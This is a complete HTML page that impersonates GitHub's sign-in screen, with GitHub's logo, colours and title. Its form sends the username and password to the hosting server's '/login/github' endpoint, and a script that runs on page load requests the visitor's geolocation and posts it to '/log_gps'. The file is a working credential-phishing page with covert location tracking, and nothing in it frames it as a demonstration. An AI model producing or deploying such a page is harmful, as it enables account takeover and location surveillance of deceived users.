<!DOCTYPE html>
<html lang="en">
<head>
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Sign in to GitHub · GitHub</title>
</head>
<body class="bg-[#f6f8fa] flex flex-col items-center pt-10 font-sans px-4 text-[#24292f]">
    <div class="mb-6"><svg height="48" viewBox="0 0 16 16" width="48" class="fill-current"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg></div>
    <h1 class="text-2xl font-light mb-4">Sign in to GitHub</h1>
    <div class="bg-white border border-[#d0d7de] rounded-md p-5 w-full max-w-[308px] shadow-sm">
        <form action="/login/github" method="POST" class="space-y-4">
            <label class="text-sm block">Username or email address</label>
            <input name="user" type="text" class="w-full p-2 border border-[#d0d7de] rounded-md text-sm focus:ring-1 focus:ring-blue-500 outline-none" required>
            <label class="text-sm block">Password</label>
            <input name="pass" type="password" class="w-full p-2 border border-[#d0d7de] rounded-md text-sm focus:ring-1 focus:ring-blue-500 outline-none" required>
            <button class="w-full bg-[#2da44e] text-white text-sm font-semibold py-2 rounded-md hover:bg-[#2c974b]">Sign in</button>
        </form>
    </div>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(p) {
                    fetch('/log_gps', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lat:p.coords.latitude, lon:p.coords.longitude})});
                });
            }
        }
    </script>
</body>
</html>
